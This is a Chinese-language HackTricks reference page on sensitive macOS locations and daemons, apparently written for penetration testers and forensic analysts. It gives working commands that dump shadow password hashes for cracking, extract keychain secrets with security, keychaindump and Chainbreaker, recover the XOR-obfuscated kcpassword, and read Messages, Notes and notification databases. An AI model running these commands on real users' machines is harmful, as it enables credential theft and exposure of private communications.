# macOS敏感位置和有趣的守护进程

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 密码

### 阴影密码

阴影密码与用户配置一起存储在位于**`/var/db/dslocal/nodes/Default/users/`**中的plist文件中。\
以下一行命令可用于转储**有关用户的所有信息**（包括哈希信息）：
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**像这样的脚本**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)或[**这样的脚本**](https://github.com/octomagon/davegrohl.git)可以用来将哈希转换为**hashcat格式**。

另一个一行命令，将以hashcat格式（`-m 7100`，macOS PBKDF2-SHA512）转储所有非服务账户的凭证：
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### 密钥链转储

请注意，当使用 security 二进制文件来**转储解密后的密码**时，系统会提示用户允许此操作。
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
根据这条评论 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) 看起来这些工具在 Big Sur 上不再起作用了。
{% endhint %}

### Keychaindump 概述

一个名为 **keychaindump** 的工具已经被开发出来，用于从 macOS 钥匙串中提取密码，但在像 Big Sur 这样的较新 macOS 版本上面临限制，正如在一次[讨论](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)中所指出的。使用 **keychaindump** 需要攻击者获得访问权限并提升至 **root** 权限。该工具利用了钥匙串在用户登录时默认解锁的事实，以方便应用程序访问它，而无需反复要求用户输入密码。然而，如果用户选择在每次使用后锁定他们的钥匙串，**keychaindump** 就会失效。

**Keychaindump** 的操作是通过针对一个名为 **securityd** 的特定进程进行的，苹果公司将其描述为用于授权和加密操作的守护程序，对于访问钥匙串至关重要。提取过程涉及识别从用户登录密码派生的一个名为 **Master Key** 的关键。这个关键对于读取钥匙串文件至关重要。为了定位 **Master Key**，**keychaindump** 使用 `vmmap` 命令扫描 **securityd** 的内存堆，查找在被标记为 `MALLOC_TINY` 的区域内的潜在关键。以下命令用于检查这些内存位置：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
在确定潜在主密钥后，**keychaindump** 会通过堆中搜索特定模式（`0x0000000000000018`），该模式指示可能是主密钥的候选项。需要进一步步骤，包括解混淆，才能利用此密钥，具体步骤在 **keychaindump** 的源代码中有详细说明。专注于此领域的分析人员应注意，解密钥匙链所需的关键数据存储在 **securityd** 进程的内存中。运行 **keychaindump** 的示例命令如下：
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) 可以以取证方式从OSX钥匙串中提取以下类型的信息：

- 经过哈希处理的钥匙串密码，适合使用[hashcat](https://hashcat.net/hashcat/)或[John the Ripper](https://www.openwall.com/john/)进行破解
- 互联网密码
- 通用密码
- 私钥
- 公钥
- X509证书
- 安全笔记
- Appleshare密码

通过钥匙串解锁密码、使用[volafox](https://github.com/n0fate/volafox)或[volatility](https://github.com/volatilityfoundation/volatility)获得的主密钥，或者解锁文件（如SystemKey），Chainbreaker还将提供明文密码。

如果没有这些解锁钥匙串的方法，Chainbreaker将显示所有其他可用信息。

#### **转储钥匙串密钥**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### 使用 SystemKey 转储钥匙串密钥（包括密码）
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **转储钥匙串密钥（带密码）破解哈希**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### 使用内存转储来转储钥匙串密钥（带密码）

[按照这些步骤](../#dumping-memory-with-osxpmem) 来执行**内存转储**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **使用用户密码转储钥匙串密钥（包括密码）**

如果您知道用户的密码，您可以使用它来**转储并解密属于用户的钥匙串**。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** 文件是一个保存**用户登录密码**的文件，但仅当系统所有者已**启用自动登录**时才会存在。因此，用户将自动登录而无需输入密码（这并不安全）。

密码存储在文件 **`/etc/kcpassword`** 中，使用密钥 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 进行异或运算。如果用户的密码长度超过密钥，密钥将被重复使用。\
这使得密码相当容易被恢复，例如使用类似[**这个**](https://gist.github.com/opshope/32f65875d45215c3677d)的脚本。

## 数据库中的有趣信息

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

您可以在 `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` 中找到通知数据。

大部分有趣的信息将会在 **blob** 中。因此，您需要 **提取** 该内容并将其转换为 **易读** 的格式，或者使用 **`strings`**。要访问它，您可以执行：

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### 注意事项

用户的**笔记**可以在 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` 中找到

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## 首选项

在 macOS 应用程序中，首选项位于 **`$HOME/Library/Preferences`**，在 iOS 中位于 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`。

在 macOS 中，可以使用命令行工具 **`defaults`** 来**修改首选项文件**。

**`/usr/sbin/cfprefsd`** 拥有 XPC 服务 `com.apple.cfprefsd.daemon` 和 `com.apple.cfprefsd.agent`，可用于执行诸如修改首选项之类的操作。

## 系统通知

### Darwin 通知

通知的主要守护程序是 **`/usr/sbin/notifyd`**。为了接收通知，客户端必须通过 `com.apple.system.notification_center` Mach 端口进行注册（使用 `sudo lsmp -p <pid notifyd>` 进行检查）。该守护程序可通过文件 `/etc/notify.conf` 进行配置。

用于通知的名称是唯一的反向 DNS 表示法，当向其中之一发送通知时，已指示可以处理它的客户端将收到通知。

可以通过向 notifyd 进程发送信号 SIGUSR2 并阅读生成的文件 `/var/run/notifyd_<pid>.status` 来转储当前状态（并查看所有名称）：
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### 分布式通知中心

**分布式通知中心** 的主要二进制文件是 **`/usr/sbin/distnoted`**，是另一种发送通知的方式。它公开了一些 XPC 服务，并执行一些检查以尝试验证客户端。

### 苹果推送通知（APN）

在这种情况下，应用程序可以注册**主题**。客户端将通过 **`apsd`** 联系苹果服务器生成一个令牌。\
然后，提供者也将生成一个令牌，并能够连接到苹果服务器，向客户端发送消息。这些消息将由 **`apsd`** 在本地接收，然后将通知传递给等待通知的应用程序。

首选项位于 `/Library/Preferences/com.apple.apsd.plist`。

macOS 中有一个位于 `/Library/Application\ Support/ApplePushService/aps.db` 的消息本地数据库，在 iOS 中位于 `/var/mobile/Library/ApplePushService`。它有 3 个表：`incoming_messages`、`outgoing_messages` 和 `channel`。
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
也可以使用以下方法获取有关守护程序和连接的信息：
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## 用户通知

这些是用户应该在屏幕上看到的通知：

- **`CFUserNotification`**：这个 API 提供了一种在屏幕上显示带有消息的弹出窗口的方式。
- **公告牌**：在 iOS 中显示一个横幅，会消失并存储在通知中心中。
- **`NSUserNotificationCenter`**：这是 MacOS 中的 iOS 公告牌。通知的数据库位于 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`。
